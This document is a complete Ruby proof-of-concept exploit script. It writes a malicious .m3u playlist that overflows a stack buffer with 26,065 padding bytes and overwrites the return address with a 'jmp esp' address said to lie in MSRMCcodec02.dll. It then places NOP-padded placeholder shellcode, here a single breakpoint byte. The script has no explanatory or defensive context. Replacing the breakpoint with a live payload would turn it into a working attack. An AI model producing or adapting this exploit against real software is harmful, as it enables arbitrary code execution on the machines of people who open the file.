#!/usr/bin/env ruby

file = "test1.m3u"

junk = "\x41" * 26065
eip = "\x3A\xF2\xAA\x01" # Memory addres -> 01 AA F2 3A  # OP Code for jmp esp FFE4 # File MSRMCcodec02.dll

shellcode = "\x90" * 25
shellcode += "\xcc"
shellcode += "\x90" * 25

exploit = junk + eip + shellcode

File.open(file, 'w') {|sc| sc.write(exploit)}
puts "File #{file} created"